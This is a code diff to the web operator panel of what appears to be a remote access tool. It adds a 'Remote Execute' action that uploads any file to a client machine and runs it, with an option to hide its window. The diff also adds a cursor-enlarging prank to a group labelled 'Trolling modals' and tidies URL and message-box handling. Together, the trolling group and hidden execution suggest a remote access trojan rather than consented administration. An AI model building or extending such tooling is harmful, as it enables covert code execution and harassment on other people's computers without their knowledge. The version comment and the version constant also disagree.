@@ -1,10 +1,13 @@
 /**
  * side-panel.js — Shared side action panel for desktop viewer & remote desktop pages.
+ * Version: 1.3.0
  *
  * Usage:
  *   import { initSidePanel } from "./side-panel.js";
  *   initSidePanel(clientId, document.getElementById("sidePanel"));
  */
+
+const SIDE_PANEL_JS_VERSION = "1.4.0";
 
 /* ──────────────────────────────────────────────────────────── */
 /*  Menu definition                                            */
@@ -49,9 +52,11 @@ const PANEL_GROUPS = [
     emoji: "\u{1F921}",
     color: "#f472b6",
     items: [
-      { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#f472b6", action: "wallpaper" },
-      { label: "Open URL", icon: "fa-solid fa-link", color: "#f472b6", action: "open-url" },
-      { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#f472b6", action: "message-box" },
+      { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#c084fc", action: "wallpaper" },
+      { label: "Remote Execute", icon: "fa-solid fa-bolt", color: "#f97316", action: "remote-execute" },
+      { label: "Open URL", icon: "fa-solid fa-link", color: "#22d3ee", action: "open-url" },
+      { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#fbbf24", action: "message-box" },
+      { label: "Big Mouse", icon: "fa-solid fa-arrow-pointer", color: "#4ade80", action: "big-mouse" },
     ],
   },
   {
@@ -184,6 +189,8 @@ async function patchClient(clientId, field, value) {
 const ALLOWED_EXTENSIONS = new Set(["jpg", "jpeg", "png", "bmp"]);
 const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
 const WALLPAPER_POLL_MS = 500;
+const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
+const REMOTE_EXECUTE_POLL_MS = 500;
 
 function formatBytes(bytes) {
   const value = Number(bytes) || 0;
@@ -431,6 +438,229 @@ function uploadWallpaper(clientId, file) {
 }
 
 /* ──────────────────────────────────────────────────────────── */
+/*  Remote Execute                                             */
+/* ──────────────────────────────────────────────────────────── */
+
+function remoteExecutePhaseLabel(phase) {
+  switch (phase) {
+    case "queued": return "Queued";
+    case "staging": return "Staging on server";
+    case "client_transfer": return "Uploading to client";
+    case "chmod": return "Setting permissions";
+    case "execute": return "Starting process";
+    case "succeeded": return "Execution completed";
+    case "failed": return "Failed";
+    default: return "Remote execute";
+  }
+}
+
+function remoteExecuteErrorText(status) {
+  const err = status?.error || {};
+  const parts = [
+    err.message || status?.message || "Remote execute failed",
+    err.phase || status?.phase ? `Step: ${remoteExecutePhaseLabel(err.phase || status.phase)}` : "",
+    `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
+    err.destinationPath || status?.destinationPath ? `Destination: ${err.destinationPath || status.destinationPath}` : "",
+    err.clientMessage ? `Client: ${err.clientMessage}` : "",
+    err.serverMessage ? `Server: ${err.serverMessage}` : "",
+    err.code ? `Code: ${err.code}` : "",
+  ].filter(Boolean);
+  return parts.join("\n");
+}
+
+function renderRemoteExecuteDetails(status, file) {
+  const transferred = formatBytes(status.bytesTransferred || 0);
+  const total = formatBytes(status.totalBytes || file.size || 0);
+  const speed = formatSpeed(status.speedBytesPerSecond || 0);
+  const destination = status.destinationPath || "unknown destination";
+  return `
+    <div class="sp-progress-detail">${escapeHtml(file.name)} · ${transferred} / ${total} · ${speed}</div>
+    <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
+    <div class="sp-progress-detail">Phase: ${escapeHtml(remoteExecutePhaseLabel(status.phase))}</div>
+  `;
+}
+
+async function openRemoteExecuteModal(clientId) {
+  const body = await createSpModal({
+    title: "Remote Execute",
+    confirmLabel: "Upload & Run",
+    bodyHtml: `
+      <label class="sp-field">
+        <span>File (any type)</span>
+        <input type="file" data-rex-file class="sp-input" />
+      </label>
+      <label class="sp-field">
+        <span>Arguments (optional)</span>
+        <input type="text" data-rex-args class="sp-input" placeholder='e.g. --silent "/path with spaces"' />
+      </label>
+      <label class="sp-field sp-field-check">
+        <input type="checkbox" data-rex-hide />
+        <span>Hide window (executables/scripts only)</span>
+      </label>
+      <p class="sp-help">Uploads to a temp folder on the client, then runs or opens the file. Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.</p>
+    `,
+    onReady: (overlay) => {
+      const fileInput = overlay.querySelector("[data-rex-file]");
+      if (fileInput) fileInput.focus();
+    },
+  });
+  if (!body) return;
+
+  const fileInput = body.querySelector("[data-rex-file]");
+  const argsInput = body.querySelector("[data-rex-args]");
+  const hideInput = body.querySelector("[data-rex-hide]");
+  const file = fileInput?.files?.[0];
+  if (!file) {
+    showToast("Select a file to execute", "error");
+    return;
+  }
+  if (file.size <= 0) {
+    showToast("File is empty", "error");
+    return;
+  }
+  if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
+    showToast(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`, "error");
+    return;
+  }
+
+  uploadRemoteExecute(clientId, file, {
+    args: String(argsInput?.value || "").trim(),
+    hideWindow: !!hideInput?.checked,
+  });
+}
+
+function uploadRemoteExecute(clientId, file, options = {}) {
+  const formData = new FormData();
+  formData.append("file", file);
+  if (options.args) formData.append("args", options.args);
+  if (options.hideWindow) formData.append("hideWindow", "true");
+
+  const xhr = new XMLHttpRequest();
+
+  ensureToastContainer();
+  const progressToast = document.createElement("div");
+  progressToast.className = "sp-toast sp-toast-info sp-toast-visible sp-toast-progress";
+  progressToast.innerHTML = `
+    <i class="fa-solid fa-bolt"></i>
+    <span class="sp-progress-label">Preparing remote execute\u2026</span>
+    <div class="sp-progress-meta"></div>
+    <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
+  `;
+  toastContainer.appendChild(progressToast);
+  const bar = progressToast.querySelector(".sp-progress-bar");
+  const label = progressToast.querySelector(".sp-progress-label");
+  const meta = progressToast.querySelector(".sp-progress-meta");
+
+  let pollTimer = null;
+  let completed = false;
+
+  const cleanup = () => {
+    if (pollTimer) {
+      clearTimeout(pollTimer);
+      pollTimer = null;
+    }
+    progressToast.remove();
+  };
+
+  xhr.upload.addEventListener("progress", (e) => {
+    if (!e.lengthComputable) return;
+    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
+    bar.style.width = `${Math.min(40, Math.floor(pct * 0.4))}%`;
+    label.textContent = `Host to server\u2026 ${pct}%`;
+    meta.innerHTML = `
+      <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
+      <div class="sp-progress-detail">Staging before client transfer</div>
+    `;
+  });
+
+  async function pollJob(jobId) {
+    try {
+      const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, { credentials: "include" });
+      const status = await res.json().catch(() => ({}));
+      if (!res.ok) {
+        throw new Error(status.message || `Remote execute status failed: ${res.status}`);
+      }
+
+      const pct = status.status === "succeeded" ? 100 : Math.min(99, Math.max(0, Number(status.percent) || 0));
+      bar.style.width = `${pct}%`;
+      label.textContent = `${remoteExecutePhaseLabel(status.phase)}\u2026 ${pct}%`;
+      meta.innerHTML = renderRemoteExecuteDetails(status, file);
+
+      if (status.status === "succeeded") {
+        completed = true;
+        label.textContent = "Execution completed 100%";
+        bar.style.width = "100%";
+        setTimeout(() => {
+          cleanup();
+          showToast(`Executed successfully: ${file.name}`, "success", 6000);
+        }, 600);
+        return;
+      }
+
+      if (status.status === "failed") {
+        completed = true;
+        cleanup();
+        showToast(remoteExecuteErrorText(status), "error", 12000);
+        return;
+      }
+
+      pollTimer = setTimeout(() => pollJob(jobId), REMOTE_EXECUTE_POLL_MS);
+    } catch (err) {
+      completed = true;
+      cleanup();
+      showToast(err.message || "Remote execute status polling failed", "error", 8000);
+    }
+  }
+
+  xhr.addEventListener("load", () => {
+    if (xhr.status >= 200 && xhr.status < 300) {
+      try {
+        const res = JSON.parse(xhr.responseText);
+        if (res.ok && res.jobId) {
+          bar.style.width = `${Math.max(5, Number(res.percent) || 5)}%`;
+          label.textContent = "Waiting for client transfer\u2026";
+          meta.innerHTML = `
+            <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
+            <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
+          `;
+          pollJob(res.jobId);
+        } else {
+          completed = true;
+          cleanup();
+          showToast(res.message || "Remote execute failed", "error", 8000);
+        }
+      } catch {
+        completed = true;
+        cleanup();
+        showToast("Remote execute response was not valid JSON", "error", 6000);
+      }
+    } else {
+      let msg = "Upload failed";
+      try { msg = JSON.parse(xhr.responseText).message || msg; } catch {}
+      if (xhr.status === 403) msg = "Permission denied (requires silent-exec)";
+      completed = true;
+      cleanup();
+      showToast(msg, "error", 8000);
+    }
+  });
+
+  xhr.addEventListener("error", () => {
+    completed = true;
+    cleanup();
+    showToast("Network error during upload", "error");
+  });
+
+  xhr.addEventListener("abort", () => {
+    cleanup();
+    if (!completed) showToast("Upload cancelled", "info");
+  });
+
+  xhr.open("POST", `/api/clients/${clientId}/remote-execute`);
+  xhr.withCredentials = true;
+  xhr.send(formData);
+}
+
+/* ──────────────────────────────────────────────────────────── */
 /*  Trolling modals                                            */
 /* ──────────────────────────────────────────────────────────── */
 
@@ -438,7 +668,7 @@ function closeSpModal(overlay) {
   if (overlay && overlay.parentNode) overlay.remove();
 }
 
-function createSpModal({ title, bodyHtml, confirmLabel = "Send" }) {
+function createSpModal({ title, bodyHtml, confirmLabel = "Send", onReady }) {
   return new Promise((resolve) => {
     const overlay = document.createElement("div");
     overlay.className = "sp-modal-overlay";
@@ -469,15 +699,24 @@ function createSpModal({ title, bodyHtml, confirmLabel = "Send" }) {
     overlay.addEventListener("click", (e) => {
       if (e.target === overlay) finish(null);
     });
-    overlay.querySelector(".sp-modal-btn-confirm").addEventListener("click", () => {
+    const confirm = () => {
       const form = overlay.querySelector(".sp-modal-body");
       finish(form);
-    });
+    };
+    overlay.querySelector(".sp-modal-btn-confirm").addEventListener("click", confirm);
     overlay.addEventListener("keydown", (e) => {
-      if (e.key === "Escape") finish(null);
+      if (e.key === "Escape") {
+        finish(null);
+        return;
+      }
+      if (e.key === "Enter" && e.target && e.target.tagName !== "TEXTAREA") {
+        e.preventDefault();
+        confirm();
+      }
     });
 
     document.body.appendChild(overlay);
+    if (typeof onReady === "function") onReady(overlay);
     const firstInput = overlay.querySelector("input, textarea, select, button");
     if (firstInput) firstInput.focus();
   });
@@ -486,10 +725,20 @@ function createSpModal({ title, bodyHtml, confirmLabel = "Send" }) {
 function normalizeClientUrl(raw) {
   const value = String(raw || "").trim();
   if (!value) return { ok: false, error: "URL is required" };
+  if (value.length > 2048) return { ok: false, error: "URL is too long" };
+
   let candidate = value;
-  if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
-    candidate = `https://${candidate}`;
+  if (candidate.startsWith("//")) {
+    candidate = `https:${candidate}`;
+  } else {
+    const bareScheme = candidate.match(/^(https?):(?!\/\/)(.+)$/i);
+    if (bareScheme) {
+      candidate = `${bareScheme[1].toLowerCase()}://${bareScheme[2]}`;
+    } else if (!/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(candidate)) {
+      candidate = `https://${candidate}`;
+    }
   }
+
   try {
     const parsed = new URL(candidate);
     const scheme = parsed.protocol.replace(/:$/, "").toLowerCase();
@@ -510,9 +759,9 @@ async function openOpenUrlModal(clientId) {
     bodyHtml: `
       <label class="sp-field">
         <span>URL</span>
-        <input type="url" class="sp-input" data-sp-url placeholder="https://example.com" autocomplete="off" />
+        <input type="text" class="sp-input" data-sp-url placeholder="www.example.com or https://..." autocomplete="off" spellcheck="false" />
       </label>
-      <p class="sp-hint">Opens in the client's default browser (http/https only).</p>
+      <p class="sp-hint">Opens in the client's default browser. Accepts www., http://, https://. Press Enter to open.</p>
     `,
   });
   if (!body) return;
@@ -524,8 +773,13 @@ async function openOpenUrlModal(clientId) {
     return;
   }
 
+  showToast(`Opening ${normalized.url}…`, "info", 2500);
   try {
-    await sendCommand(clientId, "open_url", { url: normalized.url });
+    const result = await sendCommand(clientId, "open_url", { url: normalized.url });
+    if (result && result.ok === false) {
+      showToast(result.error || result.message || "Open URL failed", "error");
+      return;
+    }
     showToast(`Opened ${normalized.url}`, "success");
   } catch (err) {
     showToast(err.message || "Open URL failed", "error");
@@ -564,11 +818,64 @@ async function openMessageBoxModal(clientId) {
     return;
   }
 
+  showToast("Showing message box…", "info", 2500);
   try {
-    await sendCommand(clientId, "message_box", { title, text, icon });
-    showToast("Message box sent", "success");
+    const result = await sendCommand(clientId, "message_box", { title, text, icon });
+    if (result && result.ok === false) {
+      showToast(result.error || result.message || "Message box failed", "error");
+      return;
+    }
+    showToast("Message box shown on client", "success");
   } catch (err) {
     showToast(err.message || "Message box failed", "error");
+  }
+}
+
+async function openBigMouseModal(clientId) {
+  const body = await createSpModal({
+    title: "Big Mouse",
+    confirmLabel: "Apply",
+    bodyHtml: `
+      <label class="sp-field">
+        <span>Duration (seconds)</span>
+        <input type="number" class="sp-input" data-sp-duration min="5" max="300" value="30" step="1" />
+      </label>
+      <div class="sp-field sp-icon-field" style="display:flex;gap:8px;flex-wrap:wrap">
+        <button type="button" class="sp-modal-btn" data-sp-preset="15">15s</button>
+        <button type="button" class="sp-modal-btn" data-sp-preset="30">30s</button>
+        <button type="button" class="sp-modal-btn" data-sp-preset="60">60s</button>
+      </div>
+      <p class="sp-hint">Maximizes the Windows cursor size, then restores automatically. Windows only.</p>
+    `,
+    onReady(overlay) {
+      const input = overlay.querySelector("[data-sp-duration]");
+      for (const btn of overlay.querySelectorAll("[data-sp-preset]")) {
+        btn.addEventListener("click", (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          if (input) input.value = btn.getAttribute("data-sp-preset") || "30";
+        });
+      }
+    },
+  });
+  if (!body) return;
+
+  const durationSec = Math.floor(Number(body.querySelector("[data-sp-duration]")?.value || 30));
+  if (!Number.isFinite(durationSec) || durationSec < 5 || durationSec > 300) {
+    showToast("Duration must be 5–300 seconds", "error");
+    return;
+  }
+
+  showToast(`Making cursor huge for ${durationSec}s…`, "info", 2500);
+  try {
+    const result = await sendCommand(clientId, "cursor_big", { durationSec });
+    if (result && result.ok === false) {
+      showToast(result.error || result.message || "Big mouse failed", "error");
+      return;
+    }
+    showToast(result?.message || `Big mouse applied for ${durationSec}s`, "success");
+  } catch (err) {
+    showToast(err.message || "Big mouse failed", "error");
   }
 }
 
@@ -623,12 +930,20 @@ async function handleAction(clientId, action) {
         triggerWallpaperUpload(clientId);
         break;
 
+      case "remote-execute":
+        openRemoteExecuteModal(clientId);
+        break;
+
       case "open-url":
         openOpenUrlModal(clientId);
         break;
 
       case "message-box":
         openMessageBoxModal(clientId);
+        break;
+
+      case "big-mouse":
+        openBigMouseModal(clientId);
         break;
 
       default:
